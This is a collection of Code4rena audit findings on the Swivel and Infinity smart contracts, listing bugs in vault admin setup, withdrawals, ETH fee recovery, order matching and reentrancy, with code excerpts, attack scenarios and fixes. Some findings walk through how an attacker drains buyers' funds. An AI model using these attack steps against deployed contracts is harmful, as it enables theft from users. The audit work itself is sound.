"body": "# Lines of code  https://github.com/code-423n4/2022-07-swivel/blob/main/Marketplace/MarketPlace.sol#L77 https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/Creator.sol#L41 https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L32   # Vulnerability details  ## Description  `MarketPlace.createMarket()` calls `Creator.create()` which creates an instance of `ZcToken` and a `VaultTracker`. `VaultTracker` takes `msg.sender` as the admin. We know that if contract A calls contract B which calls contract C, `msg.sender` in contract C is the address of B i.e. the `msg.sender` in VaultTracker is the address of the creator contract. However, the creator contract is not able (and not supposed to) interact with the VaultTracker unlike the marketplace contract.  ## Tools used Manual analysis  ## Recommended Mitigation Steps  Modify the constructor of the VaultTracker contract so that the creator contract can pass in msg.sender (MarketPlace\u2019s address) to be used as admin.  "}, {"title": "ZcToken.withdraw will send user 0 tokens if called after maturity deadline but before market is set mature", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/32", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Tokens/ZcToken.sol#L99 https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Tokens/ZcToken.sol#L92   # Vulnerability details  ## Impact  If `maturityRate` is still `0` after maturity deadline (because no transactions setting `maturityRate` have been executed yet), then `previewWithdraw` calculated amount (used by `ZcToken.withdraw` function) is `0` and thus `withdraw` function will send `0` underlying tokens to user, which might be very confusing to user. Subsequent call to the same function will send him correct amount.  The same problem applies to all view functions in `ZcToken` contract - they use saved market `maturityRate`, which can be `0` even past deadline time and functions revert or return `0` in this case.  Incorrect withdrawal behaviour:  1. Bob has some `ZcToken`s. 2. Right at the time of maturity Bob tries to withdraw his underlying tokens by calling `ZcToken.withdraw` with some underlying amount. 3. Instead of receiving corresponding amount, Bob receives nothing (but transaction still succeeds and he uses gas for it).  ## Proof of Concept  1. `withdraw`: calculates `previewAmount` from `previewWithdraw`  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Tokens/ZcToken.sol#L99   2. `previewWithdraw`: multiplication by `maturityRate` returns 0  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Tokens/ZcToken.sol#L92  ## Recommended Mitigation Steps  Add `getMaturityRate` function to `ZcToken`, which will return either market's `maturityRate` or (if it's `0`) current market's `exchangeRate`. Use this function instead of `maturityRate` everywhere across `ZcToken`.   "}, {"title": "should use >= instead of >", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/21", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/VaultTracker/VaultTracker.sol#L86 https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/VaultTracker/VaultTracker.sol#L158   # Vulnerability details  ## should use >= instead of >   ### description  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/VaultTracker/VaultTracker.sol#L86 https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/VaultTracker/VaultTracker.sol#L158  the comparison should be 'a >= vlt.notional' instead of a > vlt.notional  otherwise dust amounts will always be left in vlt.notional when calling `removeNotional()` or `transferNotionalFrom()`   "}, {"title": "ETH mistakenly sent over with ERC20 based takeOrders and takeMultipleOneOrders calls will be lost", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/346", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363   # Vulnerability details  takeOrders() and takeMultipleOneOrders() are the main user facing functionality of the protocol. Both require `currency` to be fixed for the call and can have it either as a ERC20 token or ETH. This way, the probability of a user sending over a ETH with the call whose `currency` is a ERC20 token isn't negligible. However, in this case ETH funds of a user will be permanently lost.  Setting the severity to medium as this is permanent fund freeze scenario conditional on a user mistake, which probability can be deemed high enough as the same functions are used for ETH and ERC20 orders.  ## Proof of Concept  Both takeOrders() and takeMultipleOneOrders() only check that ETH funds are enough to cover the order's `totalPrice`:  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  When `currency` is some ERC20 token, while `msg.value > 0`, the `msg.value` will be permanently frozen within the contract.  ## Recommended Mitigation Steps  Consider adding the check for `msg.value` to be zero for the cases when it is not utilized:  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } else {       require(msg.value == 0, 'non-zero ETH value');     } ```  "}, {"title": "Accumulated ETH fees of InfinityExchange cannot be retrieved", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/296", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232   # Vulnerability details  ETH fees accumulated from takeOrders() and takeMultipleOneOrders() operations are permanently frozen within the contract as there is only one way designed to retrieve them, a rescueETH() function, and it will work as intended, not being able to access ETH balance of the contract.  Setting the severity as high as the case is a violation of system's core logic and a permanent freeze of ETH revenue of the project.  ## Proof of Concept  Fees are accrued in user-facing takeOrders() and takeMultipleOneOrders() via the following call sequences:  ``` takeOrders -> _takeOrders -> _execTakeOrders -> _transferNFTsAndFees -> _transferFees takeMultipleOneOrders -> _execTakeOneOrder -> _transferNFTsAndFees -> _transferFees ```  While token fees are transferred right away, ETH fees are kept with the InfinityExchange contract:  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1119-L1141  ```solidity   /**    * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is              the one that actually 'pays' the fees    * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'    * @param seller the seller    * @param buyer the buyer    * @param amount amount to transfer    * @param currency currency of the transfer    */   function _transferFees(     address seller,     address buyer,     uint256 amount,     address currency   ) internal {     // protocol fee     uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;     uint256 remainingAmount = amount - protocolFee;     // ETH     if (currency == address(0)) {       // transfer amount to seller       (bool sent, ) = seller.call{value: remainingAmount}('');       require(sent, 'failed to send ether to seller'); ```  I.e. when `currency` is ETH the fee part of the amount, `protocolFee`, is left with the InfinityExchange contract.  The only way to retrieve ETH from the contract is rescueETH() function:  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232  ```solidity   /// @dev used for rescuing exchange fees paid to the contract in ETH   function rescueETH(address destination) external payable onlyOwner {     (bool sent, ) = destination.call{value: msg.value}('');     require(sent, 'failed');   } ```  However, it cannot reach ETH on the contract balance as `msg.value` is used as the amount to be sent over. I.e. only ETH attached to the rescueETH() call is transferred from `owner` to `destination`. ETH funds that InfinityExchange contract holds remain inaccessible.  ## Recommended Mitigation Steps  Consider adding contract balance to the funds transferred:  ```solidity   /// @dev used for rescuing exchange fees paid to the contract in ETH   function rescueETH(address destination) external payable onlyOwner { -   (bool sent, ) = destination.call{value: msg.value}(''); +   (bool sent, ) = destination.call{value: address(this).balance}('');     require(sent, 'failed');   } ```  "}, {"title": "Maker buy order with no specified NFT tokenIds may get fulfilled in `matchOneToManyOrders` without receiving any NFT", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/254", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116   # Vulnerability details  The call stack: matchOneToManyOrders() -> _matchOneMakerSellToManyMakerBuys() -> _execMatchOneMakerSellToManyMakerBuys() -> _execMatchOneToManyOrders() -> _transferMultipleNFTs()  Based on the context, a maker buy order can set `OrderItem.tokens` as an empty array to indicate that they can accept any tokenId in this collection, in that case, `InfinityOrderBookComplication.doTokenIdsIntersect()` will always return `true`.  However, when the system matching a sell order with many buy orders, the `InfinityOrderBookComplication` contract only ensures that the specified tokenIds intersect with the sell order, and the total count of specified tokenIds equals the sell order's quantity (`makerOrder.constraints[0]`).  This allows any maker buy order with same collection and `empty tokenIds` to be added to `manyMakerOrders` as long as there is another maker buy order with specified tokenIds that matched the sell order's tokenIds.  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116  ```solidity function canExecMatchOneToMany(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.MakerOrder[] calldata manyMakerOrders   ) external view override returns (bool) {     uint256 numItems;     bool isOrdersTimeValid = true;     bool itemsIntersect = true;     uint256 ordersLength = manyMakerOrders.length;     for (uint256 i = 0; i < ordersLength; ) {       if (!isOrdersTimeValid || !itemsIntersect) {         return false; // short circuit       }        uint256 nftsLength = manyMakerOrders[i].nfts.length;       for (uint256 j = 0; j < nftsLength; ) {         numItems += manyMakerOrders[i].nfts[j].tokens.length;         unchecked {           ++j;         }       }        isOrdersTimeValid =         isOrdersTimeValid &&         manyMakerOrders[i].constraints[3] <= block.timestamp &&         manyMakerOrders[i].constraints[4] >= block.timestamp;        itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);        unchecked {         ++i;       }     }      bool _isTimeValid = isOrdersTimeValid &&       makerOrder.constraints[3] <= block.timestamp &&       makerOrder.constraints[4] >= block.timestamp;      uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);     uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);      bool _isPriceValid = false;     if (makerOrder.isSellOrder) {       _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;     } else {       _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;     }      return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;   } ```  However, because `buy.nfts` is used as `OrderItem` to transfer the nfts from seller to buyer, and there are no tokenIds specified in the matched maker buy order, the buyer wont receive any nft (`_transferERC721s` does nothing, 0 transfers) despite the buyer paid full in price.  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L763-L786  ```solidity function _execMatchOneMakerSellToManyMakerBuys(     bytes32 sellOrderHash,     bytes32 buyOrderHash,     OrderTypes.MakerOrder calldata sell,     OrderTypes.MakerOrder calldata buy,     uint256 startGasPerOrder,     uint256 execPrice,     uint16 protocolFeeBps,     uint32 wethTransferGasUnits,     address weth   ) internal {     isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;     uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;     uint256 remainingAmount = execPrice - protocolFee;     _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);     _emitMatchEvent(       sellOrderHash,       buyOrderHash,       sell.signer,       buy.signer,       buy.execParams[0],       buy.execParams[1],       execPrice     ); ```  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1080-L1092  ```solidity function _transferERC721s(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     uint256 numTokens = item.tokens.length;     for (uint256 i = 0; i < numTokens; ) {       IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);       unchecked {         ++i;       }     }   } ```   ### PoC  1. Alice signed and submitted a maker buy order #1, to buy `2` Punk with `2 WETH` and specified tokenIds = `1`,`2` 2. Bob signed and submitted a maker buy order #2, to buy `1` Punk with `1 WETH` and with no specified tokenIds. 3. Charlie signed and submitted a maker sell order #3, ask for `3 WETH` for `2` Punk and specified tokenIds = `1`,`2` 4. The match executor called `matchOneToManyOrders()` match Charlie's sell order #3 with buy order #1 and #2, Alice received `2` Punk, Charlie received `3 WETH`, Bob paid `1 WETH` and get nothing in return.  ### Recommendation  Change to:  ```solidity function canExecMatchOneToMany(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.MakerOrder[] calldata manyMakerOrders   ) external view override returns (bool) {     uint256 numItems;     uint256 numConstructedItems;     bool isOrdersTimeValid = true;     bool itemsIntersect = true;     uint256 ordersLength = manyMakerOrders.length;     for (uint256 i = 0; i < ordersLength; ) {       if (!isOrdersTimeValid || !itemsIntersect) {         return false; // short circuit       }        numConstructedItems += manyMakerOrders[i].constraints[0];        uint256 nftsLength = manyMakerOrders[i].nfts.length;       for (uint256 j = 0; j < nftsLength; ) {         numItems += manyMakerOrders[i].nfts[j].tokens.length;         unchecked {           ++j;         }       }        isOrdersTimeValid =         isOrdersTimeValid &&         manyMakerOrders[i].constraints[3] <= block.timestamp &&         manyMakerOrders[i].constraints[4] >= block.timestamp;        itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);        unchecked {         ++i;       }     }      bool _isTimeValid = isOrdersTimeValid &&       makerOrder.constraints[3] <= block.timestamp &&       makerOrder.constraints[4] >= block.timestamp;      uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);     uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);      bool _isPriceValid = false;     if (makerOrder.isSellOrder) {       _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;     } else {       _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;     }      return (numItems == makerOrder.constraints[0]) && (numConstructedItems == numItems) && _isTimeValid && itemsIntersect && _isPriceValid;   } ```  "}, {"title": "Overpayment of native ETH is not refunded to buyer", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/244", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L119-L121 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232   # Vulnerability details  `InfinityExchange` accepts payments in native ETH, but does not return overpayments to the buyer. Overpayments are likely in the case of auction orders priced in native ETH.  In the case of a Dutch or reverse Dutch auction priced in native ETH, the end user is likely to send more ETH than the final calculated price in order to ensure their transaction succeeds, since price is a function of `block.timestamp`, and the user cannot predict the timestamp at which their transaction will be included.   In a Dutch auction, final price may decrease below the calculated price at the time the transaction is sent. In a reverse Dutch auction, the price may increase above the calculated price by the time a transaction is included, so the buyer is incentivized to provide additional ETH in case the price rises while their transaction is waiting for inclusion.  The `takeOrders` and `takeMultipleOneOrders` functions both check that the buyer has provided an ETH amount greater than or equal to the total price at the time of execution:  [`InfinityExchange#takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363)  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  [`InfinityExchange#takeMultipleOneOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327)  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  However, neither of these functions refunds the user in the case of overpayment. Instead, overpayment amounts will accrue in the contract balance.  Moreover, since there is a bug in `rescueETH` that prevents ether withdrawals from `InfinityExchange`, these overpayments will be locked permanently: the owner cannot withdraw and refund overpayments manually.  Scenario: - Alice creates a sell order for her token with constraints that set up a reverse Dutch auction: start price `500`, end price `2000`, start time `1`, end time `5`. - Bob fills the order at time `2`. The calculated price is `875`. Bob is unsure when his transaction will be included, so provides a full `2000` wei payment. - Bob's transaction is included at time `3`. The calculated price is `1250`. - Bob's additional `750` wei are locked in the contract and not refunded.  Suggestion: Calculate and refund overpayment amounts to callers.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/232", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Summary  We list 2 low-critical findings: * (Low) Misunderstanding params * (Low) `takeMultipleOneOrders` doesn\u2019t check nfts length  # (Low) Misunderstanding params  ## Impact  `constraints` in struct MakerOrder is an array which is easily misused.  ## Proof of Concept  It hard coded a number to indicate an element in `constraints` array:  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L515-L516  ```     bool orderExpired = isUserOrderNonceExecutedOrCancelled[order.signer][order.constraints[5]] ||       order.constraints[5] < userMinOrderNonce[order.signer]; ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to define variables rather than `constraints` array, or use constraint index to indicate:  ```     enum CONSTRAINT_INDEX {         numItems,         startPrice,         endPrice,         startTime,         endTime,         nonce     } ```  # (Low) `takeMultipleOneOrders` doesn\u2019t check nfts length  ## Impact  In `matchOneToOneOrders`, it checks that the `nfts` of orders must be 1: https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityOrderBookComplication.sol#L32-L37  But in `takeMultipleOneOrders`, it doesn\u2019t check that the `nfts` of orders must be 1, and the comment says: Batch buys or sells orders with specific `1` NFTs.  ## Tools Used  None  ## Recommended Mitigation Steps  Also check nfts length in `\u200b\u200btakeMultipleOneOrders`. "}, {"title": "Reentrancy from matchOneToManyOrders", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/184", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L178 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L216 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L230   # Vulnerability details  `matchOneToManyOrders` doesn't conform to Checks-Effects-Interactions pattern, and updates the maker order nonce only after the NFTs and payment have been sent. Using this, a malicious user can re-enter the contract and re-fulfill the order using `takeOrders`.  ## Impact Orders can be executed twice. User funds would be lost.  ## Proof of Concept `matchOneToManyOrders` will set the order nonce as used only after the tokens are being sent: ```   function matchOneToManyOrders(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.MakerOrder[] calldata manyMakerOrders) external {     ...     if (makerOrder.isSellOrder) {       for (uint256 i = 0; i < ordersLength; ) {         ...         _matchOneMakerSellToManyMakerBuys(...); // @audit will transfer tokens in here         ...       }       //@audit setting nonce to be used only here       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;     } else {       for (uint256 i = 0; i < ordersLength; ) {         protocolFee += _matchOneMakerBuyToManyMakerSells(...); // @audit will transfer tokens in here         ...       }       //@audit setting nonce to be used only here       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;       ...   } ```  So we can see that tokens are being transferred before nonce is being set to executed.  Therefore, POC for an attack - Alice wants to buy 2 unspecified WolfNFT, and she will pay via AMP, an ERC-777 token. Malicious user Bob will set up an offer to sell 2 WolfNFT. The MATCH_EXECUTOR will match the offers. Bob will set up a contract such that upon receiving of AMP, it will call [`takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L336) with Alice's order, and 2 other WolfNFTs. (Note that although `takeOrders` is `nonReentrant`, `matchOneToManyOrders` is not, and so the reentrancy will succeed.)  So in `takeOrders`, the contract will match Alice's order with Bob's NFTs, and then set Alice's order's nonce to true, then `matchOneToManyOrders` execution will resume, and again will set Alice's order's nonce to true.  Alice ended up buying 4 WolfNFTs although she only signed an order for 2. Tough luck, Alice.  (Note: a similar attack can be constructed via ERC721's onERC721Received.)  ## Recommended Mitigation Steps Conform to CEI and set the nonce to true before executing external calls.  "}, {"title": "Sellers may lose NFTs when orders is matched with `matchOrders()`", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/164", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/infinitydotxyz/exchange-contracts-v2/blob/c51b7e8af6f95cc0a3b5489369cbc7cee060434b/contracts/core/InfinityOrderBookComplication.sol#L205   # Vulnerability details  ## Impact  Function `matchOrders` uses custom constraints to make the matching more flexible, allow seller/buyer to specify maximum/minimum number of NFTs they want to sell/buy. This function first does some checks and then execute matching.  But in [function](https://github.com/infinitydotxyz/exchange-contracts-v2/blob/c51b7e8af6f95cc0a3b5489369cbc7cee060434b/contracts/core/InfinityOrderBookComplication.sol#L192) `areNumItemsValid()`, there is a wrong checking will lead to wrong logic in `matchOrders()` function.  Instead of checking if `numConstructedItems <= sell.constraints[0]` or not, function `areNumItemsValid()` check if `buy.constraints[0] <= sell.constraints[0]`. It will lead to the scenario that `numConstructedItems > sell.constraints[0]` and make the seller sell more number of nfts than he/she allow.    ## Proof of concept   Consider the scenario 1. Alice create a sell order to sell maximum 2 in her 3 BAYC with ids `[1, 2, 3]`  2. Bob create a buy order to buy mimimum any 2 BAYC with id in list `[1, 2, 3]` 3. Match executor call `matchOrders()` to match Alice's order and Bob's one with parameter `constructs = [1, 2, 3]`  4. Function `matchOrders` will transfer all NFT in `construct` list (3 NFTs `1, 2, 3`) from seller to buyer even though seller only want to sell maximum 2 NFTs.  For more information, please check this PoC.  https://gist.github.com/minhquanym/a95c8652de8431c5d1d24aa4076a1878           ## Tools Used  hardhat, chai      ## Recommended Mitigation Steps  Replace check `buy.constraints[0] <= sell.constraints[0]` with `numConstructedItems <= sell.constraints[0]`  "}, {"title": "Lose of funds in matchOneToManyOrders() and takeOrders() and matchOrders() because code don't check that different ids in one collection are different, so it's possible to sell one id multiple time instead of selling multiple id one time in one collection of order (lack of checks in doTokenIdsIntersect() especially for ERC1155 tokens)", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/135", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L271-L312 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L59-L116 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L245-L294 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L118-L143 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L330-L364 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L934-L951 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L145-L164 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L171-L243   # Vulnerability details  ## Impact Function `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` suppose to match `sell order` to `buy order` and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. but There is no check in their execution flow to check that an `order` has different `NFT token ids` in each one of it's collections, so even so number of tokens could be valid in `order` to `order` transfer but the number of real transferred tokens and their IDs can be different than what user specified and signed. and user funds would be lost. (because of `ERC1155` there can be more than one token for a `tokenId`, so it would be possible to transfer it)  ## Proof of Concept This is `_takeOrders()` and `` and `` code: ```   /**    * @notice Internal helper function to take orders    * @dev verifies whether order can be executed    * @param makerOrder the maker order    * @param takerItems nfts to be transferred    * @param execPrice execution price    */   function _takeOrders(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.OrderItem[] calldata takerItems,     uint256 execPrice   ) internal {     bytes32 makerOrderHash = _hash(makerOrder);     bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);     bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);     require(makerOrderValid && executionValid, 'order not verified');     _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);   } ``` As you can see it uses `canExecTakeOrder()` to check that it is valid to perform matching. This is `canExecTakeOrder()` and `areTakerNumItemsValid()` and `doTokenIdsIntersect()` code which are used in execution flow to check orders and matching validity: ```   /**    * @notice Checks whether take orders with a higher order intent can be executed    * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.           It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid           and whether the nfts intersect    * @param makerOrder the maker order    * @param takerItems the taker items specified by the taker    * @return returns whether order can be executed    */   function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)     external     view     override     returns (bool)   {     return (makerOrder.constraints[3] <= block.timestamp &&       makerOrder.constraints[4] >= block.timestamp &&       areTakerNumItemsValid(makerOrder, takerItems) &&       doItemsIntersect(makerOrder.nfts, takerItems));   }    /// @dev sanity check to make sure that a taker is specifying the right number of items   function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)     public     pure     returns (bool)   {     uint256 numTakerItems = 0;     uint256 nftsLength = takerItems.length;     for (uint256 i = 0; i < nftsLength; ) {       unchecked {         numTakerItems += takerItems[i].tokens.length;         ++i;       }     }     return makerOrder.constraints[0] == numTakerItems;   }    /**    * @notice Checks whether tokenIds intersect    * @dev This function checks whether there are intersecting tokenIds between two order items    * @param item1 first item    * @param item2 second item    * @return returns whether tokenIds intersect    */   function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)     public     pure     returns (bool)   {     uint256 item1TokensLength = item1.tokens.length;     uint256 item2TokensLength = item2.tokens.length;     // case where maker/taker didn't specify any tokenIds for this collection     if (item1TokensLength == 0 || item2TokensLength == 0) {       return true;     }     uint256 numTokenIdsPerCollMatched = 0;     for (uint256 k = 0; k < item2TokensLength; ) {       for (uint256 l = 0; l < item1TokensLength; ) {         if (           item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens         ) {           // increment numTokenIdsPerCollMatched           unchecked {             ++numTokenIdsPerCollMatched;           }           // short circuit           break;         }         unchecked {           ++l;         }       }       unchecked {         ++k;       }     }      return numTokenIdsPerCollMatched == item2TokensLength;   } ``` As you can see there is no logic to check that `token IDs` in one collection of order are different and code only checks that total number of tokens in one `order` matches the number of tokens specified and the ids in one order exists in other list defined. function `doTokenIdsIntersect()` checks to see that `tokens ids` in one collection can match list of specified tokens. because of this check lacking there are some scenarios that can cause fund lose for `ERC1155` tokens (normal `ERC721` requires more strange conditions). here is first example:  1. for simplicity let's assume collection and timestamp are valid and match for orders and token is `ERC1155` 2. `user1` has signed this order: A:`(user1 BUY 3 NFT IDs[(1,1),(2,1),(3,1)] at 15 ETH)` (buy `1` token of each `id=1,2,3`) 3. `NFT ID[1]` fair price is `1 ETH`, `NFT ID[2]` fair price is `2 ETH`, `NFT ID[3]` fair price is `12 ETH` 4. `attacker` who has 3 of `NFT ID[1]` create this list: B:`(NFT IDs[(1,1), (1,1), (1,1)] )` (list to trade `1`token of `id=1` for 3 times) 5. attacker call `takeOrders()` with this parameters: makerOrder: A , takerNfts: B 6. contract logic would check all the conditions and validate and verify orders and their matching (they intersect and total number of token to sell is equal to total number of tokens to buy and all of the B list is inside A list) and perform the transaction. 7. `attacker` would receive `15 ETH` for his 3 token of `NFT ID[1]` and steal `user1` funds. `user1` would receive 3 